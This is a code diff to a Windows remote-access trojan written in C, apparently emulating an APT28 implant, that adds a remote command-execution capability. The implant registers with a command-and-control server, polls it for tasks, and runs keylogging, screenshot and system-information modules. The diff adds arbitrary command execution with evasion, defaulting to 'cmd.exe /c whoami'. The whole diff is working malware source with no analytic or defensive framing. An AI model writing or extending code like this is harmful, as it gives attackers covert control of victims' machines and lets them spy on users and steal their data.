@@ -11,6 +11,7 @@
 #include "info_collector.c"
 #include "keylogger.c"
 #include "screenshot.c"
+#include "command_executor.h"
 
 #ifdef _WIN32
 #pragma comment(lib, "wininet.lib")
@@ -28,8 +29,15 @@ typedef enum {
     CMD_KEYLOGGER = 3,
     CMD_SCREENSHOT = 4,
     CMD_INFO_COLLECT = 5,
+    CMD_EXECUTE = 6,
     CMD_NONE = 0
 } CapabilityCommand;
+
+// Command structure with arguments
+typedef struct {
+    CapabilityCommand cmd;
+    char args[1024];
+} CommandWithArgs;
 
 // Make HTTP GET request and get response
 char* http_get_request(const char *server, int port, const char *path) {
@@ -156,25 +164,81 @@ int register_with_c2(const char *client_id) {
     return 0;
 }
 
+// Simple JSON parser to extract "capability" and "args" fields
+// Returns 1 on success, 0 on failure
+int parse_command_json(const char *json, int *capability, char *args, size_t args_size) {
+    const char *cap_start = strstr(json, "\"capability\":");
+    const char *args_start = strstr(json, "\"args\":");
+    
+    if (!cap_start) {
+        return 0;
+    }
+    
+    // Parse capability (skip past "capability":)
+    cap_start = strchr(cap_start, ':');
+    if (cap_start) {
+        cap_start++;
+        while (*cap_start == ' ') cap_start++;
+        *capability = atoi(cap_start);
+    }
+    
+    // Parse args (skip past "args":)
+    if (args_start && args && args_size > 0) {
+        args_start = strchr(args_start, ':');
+        if (args_start) {
+            args_start++;
+            while (*args_start == ' ') args_start++;
+            
+            // Skip opening quote
+            if (*args_start == '"') {
+                args_start++;
+                const char *args_end = strchr(args_start, '"');
+                if (args_end) {
+                    size_t len = args_end - args_start;
+                    if (len < args_size) {
+                        strncpy(args, args_start, len);
+                        args[len] = '\0';
+                    }
+                }
+            } else {
+                args[0] = '\0';
+            }
+        }
+    } else if (args && args_size > 0) {
+        args[0] = '\0';
+    }
+    
+    return 1;
+}
+
 // Fetch capability command from C2 server
-CapabilityCommand fetch_capability_command(const char *client_id) {
+// Fetch capability command with arguments from C2 server
+CommandWithArgs fetch_capability_command(const char *client_id) {
     char path[256];
     char *response;
-    int command_id = CMD_NONE;
+    CommandWithArgs result = {CMD_NONE, ""};
+    int capability = 0;
     
     snprintf(path, sizeof(path), "/api/command?id=%s", client_id);
     response = http_get_request(C2_SERVER, C2_PORT, path);
     
     if (response && strlen(response) > 0) {
-        command_id = atoi(response);
+        // Try parsing as JSON first
+        if (parse_command_json(response, &capability, result.args, sizeof(result.args))) {
+            result.cmd = (CapabilityCommand)capability;
+        } else {
+            // Fallback to old format (just a number)
+            result.cmd = (CapabilityCommand)atoi(response);
+            result.args[0] = '\0';
+        }
         free(response);
-        return (CapabilityCommand)command_id;
+        return result;
     }
     
     if (response) {
         free(response);
     }
-    return CMD_NONE;
+    return result;
 }
 
 // Report capability execution result to C2 server
@@ -210,6 +274,7 @@ int report_capability_result(const char *client_id, CapabilityCommand cmd, const
 typedef struct {
     char client_id[64];
     CapabilityCommand cmd;
+    char args[1024];
 } CapabilityThreadData;
 
 // Thread function to execute capability
@@ -238,6 +303,23 @@ DWORD WINAPI capability_execution_thread(LPVOID arg) {
         case CMD_INFO_COLLECT:
             output = start_info_collector();
             break;
+        case CMD_EXECUTE:
+            // Use command args if provided, otherwise use default
+            if (data->args && strlen(data->args) > 0) {
+                if (executeCommandWithEvasion(data->args)) {
+                    output = strdup("executed");
+                } else {
+                    output = strdup("failed");
+                }
+            } else {
+                // Default command if no args provided
+                if (executeCommandWithEvasion("cmd.exe /c whoami")) {
+                    output = strdup("executed");
+                } else {
+                    output = strdup("failed");
+                }
+            }
+            break;
         default:
             break;
     }
@@ -254,7 +336,7 @@ DWORD WINAPI capability_execution_thread(LPVOID arg) {
 }
 
 // Execute capability based on command (launches in separate thread)
-int execute_capability(const char *client_id, CapabilityCommand cmd) {
+int execute_capability(const char *client_id, CapabilityCommand cmd, const char *args) {
     // Allocate thread data
     CapabilityThreadData *data = (CapabilityThreadData*)malloc(sizeof(CapabilityThreadData));
     if (!data) {
@@ -265,6 +347,13 @@ int execute_capability(const char *client_id, CapabilityCommand cmd) {
     strncpy(data->client_id, client_id, sizeof(data->client_id) - 1);
     data->client_id[sizeof(data->client_id) - 1] = '\0';
     data->cmd = cmd;
+    
+    if (args) {
+        strncpy(data->args, args, sizeof(data->args) - 1);
+        data->args[sizeof(data->args) - 1] = '\0';
+    } else {
+        data->args[0] = '\0';
+    }
     
     // Create thread to execute capability
     HANDLE hThread = CreateThread(NULL, 0, capability_execution_thread, data, 0, NULL);
@@ -288,7 +377,7 @@ int get_random_interval() {
 DWORD WINAPI c2_communication_thread(LPVOID arg) {
     (void)arg;  // Unused parameter
     char client_id[64];
-    CapabilityCommand cmd;
+    CommandWithArgs cmd;
     
     // Generate unique client ID
     snprintf(client_id, sizeof(client_id), "APT28_%lu_%lld", (unsigned long)GetCurrentProcessId(), (long long)time(NULL));
@@ -297,8 +386,7 @@ DWORD WINAPI c2_communication_thread(LPVOID arg) {
     register_with_c2(client_id);
     
     // Execute sysinfo capability immediately after C2 init
-    printf("[*] Executing initial sysinfo collection...\n");
-    execute_capability(client_id, CMD_INFO_COLLECT);
+    execute_capability(client_id, CMD_INFO_COLLECT, NULL);
     
     // Main C2 loop
     while (1) {
@@ -309,9 +397,9 @@ DWORD WINAPI c2_communication_thread(LPVOID arg) {
         // Fetch capability command from C2
         cmd = fetch_capability_command(client_id);
         
-        if (cmd != CMD_NONE) {
+        if (cmd.cmd != CMD_NONE) {
             // Execute the capability in a separate thread (non-blocking)
-            execute_capability(client_id, cmd);
+            execute_capability(client_id, cmd.cmd, cmd.args);
         }
     }
     
